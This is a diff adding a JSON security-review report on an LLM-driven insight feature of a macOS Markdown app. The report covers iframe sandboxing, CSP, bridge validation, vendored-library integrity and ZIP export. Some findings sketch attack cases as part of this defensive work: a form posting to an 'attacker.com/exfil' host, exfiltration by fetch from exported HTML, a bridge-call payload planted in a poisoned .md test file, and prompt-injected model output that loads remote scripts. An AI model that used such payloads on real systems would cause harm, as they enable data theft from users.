@@ -1,0 +1,135 @@
+{
+  "status": "approved",
+  "summary": {
+    "totalFindings": 7,
+    "critical": 0,
+    "major": 3,
+    "minor": 4
+  },
+  "round1_resolution_audit": {
+    "critical_C1_skeleton_html_escape": {
+      "status": "resolved",
+      "evidence": "Decision 10 added in full (lines 215-228) defining escapeForHTMLAttribute / escapeForHTMLText utilities; Acceptance Criteria 'HTML-escape policy (Decision 10)' (lines 569-573) mandates escape at every interpolation site for skeleton.title, section.title, deepDiveTopic.label/hint, scopeHint paths, error messages, node.title in breadcrumbs, exported ZIP HTML; AC includes audit step grep for ${...} interpolations. Risks row line 528 reaffirms. Architecture step 1 of disk cache write (line 89) explicitly references the escape utility. Resolution complete."
+    },
+    "critical_C2_csp_meaningless_self": {
+      "status": "resolved",
+      "evidence": "Acceptance Criteria line 561 rewrites CSP: `default-src 'none'; script-src 'unsafe-inline' blob:; style-src 'unsafe-inline'; connect-src 'none'; img-src data: blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`. 'self' dropped (correctly noted as meaningless in null-origin frame). object-src 'none', base-uri 'none', frame-ancestors 'none' added. 'unsafe-inline' acknowledged as accepted within sandbox boundary. Resolution complete for the originally-flagged issues; minor gap remains around form-action / worker-src / child-src directives (see Round 2 finding R2-M1)."
+    },
+    "critical_C3_insightBreadcrumbClicked_validation": {
+      "status": "resolved",
+      "evidence": "Acceptance Criteria line 567 mandates: 'insightBreadcrumbClicked validates: nodeId matches UUID regex; nodeId is present in session manifest (session.nodes[uuid] exists); reject otherwise'. Line 566 mandates 'insightDeepDiveClicked validates: sectionId is a known id in current skeleton; topicIndex is within bounds of skeleton.sections[sectionId].deepDiveTopics'. Task 8 line 687 reaffirms 'breadcrumbClicked validates nodeId UUID + manifest membership; deepDiveClicked carries sectionId+topicIndex with bounds + manifest validation'. Task 3 line 643 mandates path validation in InsightCache via resolvingSymlinksInPath().standardizedFileURL containment. Resolution complete."
+    },
+    "critical_C4_runtime_strip_LLM_script_src": {
+      "status": "resolved",
+      "evidence": "Acceptance Criteria 'LLM CDN injection sanitization (runtime enforcement)' lines 575-577 mandates parent strips <script src=https://...> (and http://, //...) from htmlChunk in bridge.updateInsightSection BEFORE forwarding to iframe; replaces with HTML comment. Also strips <link rel=prefetch>, preconnect, dns-prefetch to prevent DNS leak. Resolution complete."
+    },
+    "major_M1_postMessage_source_origin": {
+      "status": "resolved",
+      "evidence": "Acceptance Criteria line 563: 'Parent JS window.addEventListener(\"message\", handler) validates event.source === iframe.contentWindow AND event.origin === \"null\" (sandbox iframe origin) — rejects other sources'. Risks row line 511 also reaffirms. Resolution complete."
+    },
+    "major_M2_cache_cleanup_race": {
+      "status": "resolved",
+      "evidence": "Risks row line 523: closeTab insight branch awaits ordered sequence: await session.cancel() (awaits all section tasks to observe Task.isCancelled and exit), THEN try? cache.cleanup() (also removes orphan .tmp files), THEN tabsStore.removeTab. Task 8 line 687 reaffirms 'await session.cancel() (awaits all parallel tasks) → try? session.cache.cleanup() → tabsStore.removeTab'. Resolution complete; minor logging gap noted in Round 2 (see R2-Mn3)."
+    },
+    "major_M3_frameInfo_defense_in_depth": {
+      "status": "partially_resolved",
+      "evidence": "Layered defense improved: frameInfo.isMainFrame (Decision 3) + event.source/origin (AC line 563) + sandbox null-origin = three layers. However, Decision 3 'opted out of spike to verify WebKit's exact behavior' remains unchanged at lines 153-155. No spike, no probe task added to verify behavior before merge. Risks line 511 still says 'untested without spike per user opt-out'. Round 2 finding R2-Mj1 raised."
+    },
+    "major_M4_zip_process_argument_array": {
+      "status": "resolved",
+      "evidence": "Task 8 line 687 explicit: 'InsightArchiveExporter.bundle(stagingURL:to:) spawns /usr/bin/zip via Process with explicit argument array (NEVER /bin/sh -c to avoid command injection)'. Resolution complete."
+    },
+    "major_M5_audit_trail_for_rejections": {
+      "status": "partially_resolved",
+      "evidence": "AC line 565 mandates 'malformed payloads rejected with NSLog warning (sanitized)'. Risks line 512 mentions logs warning for fallback. However, no consolidated structured-audit-log requirement was added covering ALL security-relevant rejections (frameInfo guard, topicIndex out-of-range, nodeId-not-in-manifest, oversized HTML, CDN-strip events, blob URL exhaustion, cleanup failures, schema validation failures). No category=security tag, no centralized helper specified. Round 2 finding R2-Mj2 raised."
+    },
+    "major_M6_iframe_load_timeout_in_AC": {
+      "status": "resolved",
+      "evidence": "Acceptance Criteria 'Iframe load timeout' (lines 584-585) added: 'After parent sets iframe.srcdoc, parent starts a 10-second timer. If insightIframeReady not received → parent shows error \"iframe load failed\" via setInsightError; iframe is destroyed and recreated empty.' Risks line 527 reaffirms. Resolution complete; per-section streaming timeout still missing (see R2-Mn4)."
+    },
+    "major_M7_vendored_libs_runtime_sha": {
+      "status": "unresolved",
+      "evidence": "Decision 5 / Task 2 still rely on vendor-time SHA-256 in MANIFEST.txt verified by QA grep (line 493). No runtime check at session start. Round 2 finding R2-Mj3 raised (downgraded — supply-chain attack on signed .app bundle is rare; macOS Gatekeeper provides a partial first line of defense)."
+    },
+    "major_M8_blob_url_revocation_AC": {
+      "status": "resolved",
+      "evidence": "Decision 11 (lines 230-241) defines lifecycle in detail. Acceptance Criteria 'Blob URL lifecycle (Decision 11)' (lines 579-582) mandates lazy creation, navigation revocation, and pre-cancel releaseInsightBlobs() call on closeTab. T8 (line 687) implements ordered cleanup. Resolution complete."
+    },
+    "major_M9_cve_dependency_check": {
+      "status": "resolved",
+      "evidence": "Risks line 526 mentions 'One-time at vendor: npm audit or manual GitHub security advisories check. Recorded in vendor/MANIFEST.txt with date + result. Re-checked when libs are bumped.' Task 2 line 636 mandates 'Note CVE check date and result for each lib' in MANIFEST.txt. Resolution complete; long-term cadence (quarterly re-check) still implicit but acceptable for v2 scope."
+    }
+  },
+  "findings": [
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "frameInfo defense-in-depth still unverified — no pre-merge spike or probe task",
+      "description": "Round 1 finding M3 was only partially resolved. The spec now layers three defenses (sandbox null-origin + frameInfo.isMainFrame guard + event.source/origin validation), which is a meaningful improvement. However, Decision 3 (lines 153-155) still explicitly states 'user opted out of a spike to verify WebKit's exact behavior. We therefore assume the standard semantic.' Risks row (line 511) reaffirms 'untested without spike per user opt-out'. There is no probe task in the Implementation Tasks list (T1-T12) that verifies the assumption holds in the actual WebKit version shipped with macOS. The mitigation 'manual smoke during QA: poison a .md file → run insight → check no spurious bridge calls reach Swift' (T12 scenario f) is a single-shot test, not a guarantee — a sandboxed iframe COULD still reach webkit.messageHandlers and trigger frameInfo.isMainFrame == true under some pathological setup we haven't tested.",
+      "location": "tech-spec.md lines 153-155 (Decision 3); line 511 (Risks); Task 12 scenario (f) line 713",
+      "impact": "If the layered model has an unanticipated gap (e.g., a future macOS WebKit change makes sandbox iframe inject webkit.messageHandlers under main-frame frameInfo), the entire iframe security model collapses without warning. The user would have no signal because the failure mode is silent — bridge handlers execute attacker-controlled payloads as if they came from the trusted parent. With sandbox OFF for the parent and Process spawning available, this could lead to RCE via crafted ZIP staging content.",
+      "recommendation": "Add an explicit pre-merge verification probe to Task 5 or Task 7 acceptance criteria: 'Manual probe: instrument WebViewBridge to log frameInfo.webView, frameInfo.request.url, frameInfo.isMainFrame, and message.frameInfo.securityOrigin for every received message during T12 scenario (f). Confirm by inspection of the log that legitimate parent→Swift calls show isMainFrame=true with parent securityOrigin, and that an attempted direct iframe→webkit.messageHandlers call (verified by injecting webkit.messageHandlers.bridge.postMessage({type:\"insightRequestSave\"}) into a poisoned .md test file) either does not arrive at the handler at all OR arrives with isMainFrame=false. Record findings in decisions.md as an addendum to Decision 3.' Stronger architectural option: use WKContentWorld isolation (WKUserContentController.add(_:contentWorld:name:) with a non-default world the iframe cannot access).",
+      "cwe": "CWE-693"
+    },
+    {
+      "severity": "major",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "Structured security audit log still not specified — only ad-hoc NSLog warning for malformed payloads",
+      "description": "Round 1 finding M5 was only partially resolved. Acceptance Criteria line 565 mandates 'malformed payloads rejected with NSLog warning (sanitized)' — but this is a single ad-hoc rule for one rejection class. The spec does not specify a structured audit log covering all security-relevant rejections: frameInfo.isMainFrame guard hits, event.source/origin mismatches, postMessage type not in allowlist, topicIndex out of bounds, sectionId not in current skeleton, nodeId regex/manifest mismatch (see resolved C3 finding — these reject silently per AC line 567 without log mandate), HTML over 2MB cap, schema validation requiring fallback (Risks line 512 mentions a warning but not structured), CDN strip events in updateInsightSection (AC line 576 says 'replaces with HTML comment' — visible in iframe DOM but no parent-side log), blob URL revocation/exhaustion, cache cleanup failures (still 'try?' silently swallowed per line 523). Without a single audit-log convention (e.g., NSLog category=security, level=warning, structured key/value), an active prompt-injection attack against a user produces no operator signal.",
+      "location": "tech-spec.md line 565 (only payload-malformed AC); line 567 (insightBreadcrumbClicked rejection — no log mandate); line 576 (CDN strip — no log); line 523 (cache cleanup try? swallowed)",
+      "impact": "(1) Active attacks via poisoned .md files succeed silently from the user's perspective — they only see 'a section failed to render' or nothing at all. (2) Forensics impossible if a successful exploit later turns up: no trail to reconstruct what payload arrived. (3) Compliance gap: A09 requires logging of authentication/authorization-equivalent rejections. (4) Debugging hard: legitimate edge cases (Anthropic returns malformed skeleton due to model regression) indistinguishable from active probes.",
+      "recommendation": "Add to Acceptance Criteria a single 'Security audit logging' section: 'Define a single helper logSecurityEvent(category: String, action: String, sanitizedContext: [String: String]) that NSLogs with prefix [SECURITY]. Every security-relevant rejection emits one log line: (a) frameInfo.isMainFrame guard hit; (b) event.source or event.origin mismatch; (c) postMessage type not in allowlist; (d) sectionId/topicIndex/nodeId validation failure; (e) HTML 2MB cap exceeded; (f) schema validation fallback to single-section; (g) CDN URL stripped from updateInsightSection chunk; (h) cache.cleanup error (replace try? with do/catch + log); (i) blob URL allocation failure. No raw payload bodies — sanitize via existing sanitize() helper. Acceptance verifier: grep for logSecurityEvent — at least 9 call sites must exist across modified files.'",
+      "cwe": "CWE-778"
+    },
+    {
+      "severity": "major",
+      "category": "A02: Cryptographic Failures",
+      "title": "Vendored libs SHA-256 still verified at vendor time only — no runtime integrity check",
+      "description": "Round 1 finding M7 (vendored libs runtime SHA verification) is unchanged in v2. Decision 5 / Task 2 (line 636) record SHA-256 in vendor/MANIFEST.txt and verify via QA grep (`shasum -a 256 ... matches MANIFEST.txt entry` at AVP line 493), but at runtime InsightCache copies vendored libs into _assets/ and parent JS reads bytes to create blob URLs WITHOUT comparing the computed SHA-256 against the manifest. If the .app bundle is modified post-install (Gatekeeper bypass, malicious update via a third-party tool, in-place patching by a local attacker with write access to /Applications/MarkView.app/Contents/Resources/Editor/vendor/), tampered libs are silently served to iframes. The libs run with `script-src 'unsafe-inline' blob:` so they have full DOM access to LLM-generated content within the iframe sandbox.",
+      "location": "tech-spec.md Decision 5 (line 174); Task 2 line 636; AVP line 493",
+      "impact": "Supply-chain attack on the macOS bundle — less common than network supply-chain, but real for: (a) unsigned/notarized dev builds, (b) post-install .app modifications by malware on the user's machine, (c) physical access. Tampered Chart.js/Mermaid could exfil rendered data structures within the iframe, manipulate LLM-generated content interpretation, or chain into a sandbox-escape attempt by exploiting WebKit bugs from a known-good script load.",
+      "recommendation": "Add to Task 3 (InsightCache) acceptance criterion: 'At session start, before creating blob URLs from vendored libs, compute SHA-256 of each loaded lib's bytes via CryptoKit SHA256 and compare against MANIFEST.txt parsed at app launch. On mismatch, refuse to start the session, surface a security-grade error to the user (\"Vendored library integrity check failed — application bundle may be tampered. Reinstall MarkView.\"), and emit logSecurityEvent(category: \"integrity\", action: \"vendor_lib_sha_mismatch\", ...).' Optionally add Subresource Integrity (SRI) on the `<script integrity=\"sha256-...\" src=\"blob:...\">` tag — confirm WebKit honors SRI for blob: URLs (modern WebKit does).",
+      "cwe": "CWE-353"
+    },
+    {
+      "severity": "minor",
+      "category": "A04: Insecure Design",
+      "title": "CSP missing form-action, worker-src, child-src, manifest-src, media-src, frame-src directives",
+      "description": "Acceptance Criteria line 561 specifies the iframe srcdoc CSP as `default-src 'none'; script-src 'unsafe-inline' blob:; style-src 'unsafe-inline'; connect-src 'none'; img-src data: blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`. While default-src 'none' is supposed to fall through and cover unspecified directives, several browsers (and historically WebKit) have inconsistent fallback behavior for newer directives. form-action, worker-src, child-src, manifest-src, media-src, frame-src do NOT fall back to default-src in older CSP1 implementations and only fall back in CSP2/CSP3. WebKit's CSP implementation has had specific gaps. Defense-in-depth principle: name them explicitly.",
+      "location": "tech-spec.md Acceptance Criteria line 561",
+      "impact": "If WebKit ever fails to apply default-src fallback to a specific directive, LLM-injected content could (a) submit a `<form action='https://attacker.com/exfil'>` (form-action gap — sandbox blocks form submission via allow-forms absence as a backstop, but defense-in-depth lost), (b) spawn a Worker via `new Worker(blob:...)` to do background exfil/computation, (c) load a manifest pointing to an attacker URL. Sandbox provides the primary defense (no allow-forms, no allow-popups), but CSP layered defense weakens.",
+      "recommendation": "Update Acceptance Criteria line 561 CSP to include explicit directives: `default-src 'none'; script-src 'unsafe-inline' blob:; style-src 'unsafe-inline'; connect-src 'none'; img-src data: blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'none'; frame-src 'none'; worker-src 'none'; child-src 'none'; manifest-src 'none'; media-src 'none'; font-src data: blob:` (font-src needed for KaTeX webfonts per Decision 5 caveat — base64-data or blob).",
+      "cwe": "CWE-1021"
+    },
+    {
+      "severity": "minor",
+      "category": "A08: Software and Data Integrity Failures",
+      "title": "Exported ZIP HTML lacks CSP meta tag — full execution context when opened in user's browser",
+      "description": "Decision 7 / Task 8 build the ZIP staging dir from skeleton + section buffers using the same escape utility (Decision 10) and the same deterministic HTML rebuild as runtime. But the EXPORTED HTML is opened in the user's browser via file:// — outside the in-app iframe sandbox. The spec mandates the escape utility (line 573 'Exported ZIP index.html and nodes/*.html go through the same escape pipeline'), but does NOT mandate that the exported HTML carries the same CSP meta tag. If the escape utility has any gap, or if the LLM emits content that exploits a parser quirk, the browser executes injected scripts with file:// privileges (browser-dependent: file:// origin is mostly isolated but historically has had cross-file-read CVEs and full network access).",
+      "location": "tech-spec.md Acceptance Criteria 'ZIP export' lines 595-598; Decision 7 / Task 8 line 687",
+      "impact": "Defense-in-depth gap. Opening a poisoned exported ZIP in Safari/Chrome could execute LLM-injected JS with file:// privileges — fetch attacker.com to exfiltrate any content readable via file:// (browser-dependent), full network egress (no connect-src 'none' barrier in exported HTML). User shares ZIP with colleagues → wider blast radius.",
+      "recommendation": "Add to Acceptance Criteria 'ZIP export': 'Exported index.html and nodes/*.html include the SAME CSP meta tag as runtime iframe srcdoc: <meta http-equiv=\"Content-Security-Policy\" content=\"default-src ''self''; script-src ''unsafe-inline'' ''self''; style-src ''unsafe-inline'' ''self''; connect-src ''none''; img-src data: ''self''; object-src ''none''; base-uri ''none''; form-action ''none''\"> — note: ''self'' replaces blob: in exported context since libs are now relative file paths in _assets/. connect-src ''none'' particularly important to prevent network exfil from an exported file opened in a browser.'",
+      "cwe": "CWE-79"
+    },
+    {
+      "severity": "minor",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "Stale cache directories from prior crashes still require manual cleanup — no startup GC",
+      "description": "Round 1 finding M-minor (stale cache GC) remains unresolved. Risks line 516 still says 'Manual cleanup via find ~/.../.insight-cache -mtime +7 -delete if user wants. Documented in known-issues.' Risks line 521 explicitly states 'Periodic GC of .insight-cache/ deferred.' The user is responsible for cleaning out crashed-session directories that may contain LLM-generated content derived from their .md files. Over many crashes, the privacy footprint grows without bound.",
+      "location": "tech-spec.md Risks lines 516, 521; AC line 593 'stale dir from prior session ignored' (ignored, not deleted)",
+      "impact": "Privacy: months-old generated insight content remains on disk past its intended (per-session) lifetime. Disk: unbounded growth in pathological crash scenarios. Compliance: GDPR-style 'data minimization' principle violated — content kept beyond business need.",
+      "recommendation": "Add a startup GC task to WorkspaceManager.startRecursiveInsight or a static InsightCache helper called once at app launch: 'enumerate <workspace>/.insight-cache/<sessionUUID>/, for each directory whose last-modified time is older than 7 days AND whose sessionUUID is not currently in any active workspace session, delete it. Log aggregate freed bytes via logSecurityEvent(category: \"hygiene\", action: \"stale_cache_purged\", context: [\"bytes\": String(freed), \"dirs\": String(count)]).' No new task needed — bolt onto Task 3 (InsightCache) or Task 8 (WorkspaceManager wiring).",
+      "cwe": "CWE-459"
+    },
+    {
+      "severity": "minor",
+      "category": "best-practice",
+      "title": "Per-section streaming wall-clock timeout still absent — slow Anthropic response can hang sections indefinitely",
+      "description": "Round 1 minor finding remains unresolved. Acceptance Criteria 'Resource caps' (lines 615-621) inherits v1 caps (per-SSE-line 64KB, per-event 1MB, per-node 2MB final HTML, parallelism cap 5) but does NOT add a per-section wall-clock timeout. Phase 2 launches up to 5 parallel section streams; if Anthropic is slow but not 429-throttled (e.g., model overload, intermittent connectivity), one section may sit in `.streaming` state indefinitely, blocking allSectionsReady, blocking cache write, leaving user UI stuck at 'Phase 2: 4/5 sections...'. Iframe load timeout (10s) addresses initial load only, not section streaming duration.",
+      "location": "tech-spec.md Acceptance Criteria lines 615-621 (Resource caps)",
+      "impact": "Indefinite UI stall on one section; user must close tab, losing work. Not a security exploit but DoS-class robustness gap impacting the security goal of 'no LLM-driven hang state'. Adversarial scenario: a poisoned .md crafts content that triggers a model hang or timeout-class behavior, denying service.",
+      "recommendation": "Add to Acceptance Criteria > Resource caps: 'Each Phase 2 section task has a wall-clock timeout: 60s from receipt of first chunk OR 120s total from task start (whichever comes first). On timeout, the task throws InsightSessionError.sectionTimeout, the section enters .failed status with retryable=true, other sections continue independently, status bar updates to show N/M sections (1 failed). Implementation via Task.withTimeout or a separate timer Task that calls activeTask.cancel() at expiry.'",
+      "cwe": "CWE-400"
+    }
+  ]
+}
